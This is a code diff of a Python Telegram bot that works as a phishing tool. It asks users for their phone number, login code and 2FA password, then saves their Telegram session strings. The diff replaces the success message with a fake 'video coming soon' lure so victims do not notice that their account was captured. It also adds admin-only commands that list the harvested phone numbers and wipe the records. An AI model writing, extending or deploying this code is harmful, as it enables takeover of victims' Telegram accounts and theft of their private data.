@@ -34,11 +34,14 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 
+# Admin ID
+ADMIN_ID = 7774500591
+
 # User states
 user_states = {}
 user_clients = {}
 user_phones = {}
-user_code_buffers = {}  # теперь будет словарь с keys: 'code' и 'message_id'
+user_code_buffers = {}
 
 # Ensure sessions dir
 os.makedirs("sessions", exist_ok=True)
@@ -66,7 +69,6 @@ async def process_phone(message: types.Message):
     user_id = message.from_user.id
     phone = message.text.strip()
 
-    # Очистка предыдущих сессий
     client = user_clients.get(user_id)
     if client:
         await client.disconnect()
@@ -74,7 +76,6 @@ async def process_phone(message: types.Message):
 
     user_phones[user_id] = phone
 
-    # Создание клиента с прокси
     client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
     await client.connect()
     user_clients[user_id] = client
@@ -82,12 +83,9 @@ async def process_phone(message: types.Message):
     try:
         await client.send_code_request(phone)
         user_states[user_id] = 'awaiting_code'
-        # инициализация буфера: code и message_id
         user_code_buffers[user_id] = {'code': '', 'message_id': None}
-
         msg_id = await send_code_keyboard(user_id, "", None)
         user_code_buffers[user_id]['message_id'] = msg_id
-
         await message.answer("⌨️ Inserisci il codice premendo i tasti qui sotto:")
     except Exception as e:
         await message.answer(f"❌ Errore nell'invio del codice: {e}")
@@ -101,7 +99,6 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
     text = f"Codice: `{current_code}`" if current_code else "Inserisci codice:"
 
     if message_id:
-        # редактируем сообщение с кнопками и кодом
         await bot.edit_message_text(
             chat_id=user_id,
             message_id=message_id,
@@ -110,7 +107,6 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
             parse_mode='Markdown'
         )
     else:
-        # отправляем новое сообщение с кнопками и возвращаем id сообщения
         msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
         return msg.message_id
 
@@ -137,10 +133,6 @@ async def process_code_button(callback_query: types.CallbackQuery):
             return
         await bot.answer_callback_query(callback_query.id)
         await try_sign_in_code(user_id, current_code)
-
-    elif data == "code_clear":
-        # Кнопка отмены убрана, поэтому просто ответим, что её нет
-        await bot.answer_callback_query(callback_query.id, text="La cancellazione non è disponibile.", show_alert=True)
 
     else:
         digit = data.split("_")[1]
@@ -224,7 +216,7 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            await message.answer("✅ Accesso 2FA riuscito! Sessione salvata.")
+            await message.answer("🎥 Il materiale video sarà disponibile qui a breve. Attendi qualche minuto...")
             await client.disconnect()
             cleanup(user_id)
         else:
@@ -233,6 +225,25 @@ async def process_2fa(message: types.Message):
         await message.answer(f"❌ Errore con 2FA: {e}")
         await client.disconnect()
         cleanup(user_id)
+
+@dp.message_handler(commands=['log'])
+async def view_logs(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    logs = sessions_col.find()
+    text = ""
+    for log in logs:
+        text += f"📱 {log.get('phone')}\n"
+    if not text:
+        text = "❌ Nessuna sessione trovata."
+    await message.answer(text)
+
+@dp.message_handler(commands=['delog'])
+async def delete_logs(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    result = sessions_col.delete_many({})
+    await message.answer(f"🗑️ Tutte le sessioni sono state eliminate: {result.deleted_count} documenti.")
 
 def cleanup(user_id):
     user_states.pop(user_id, None)
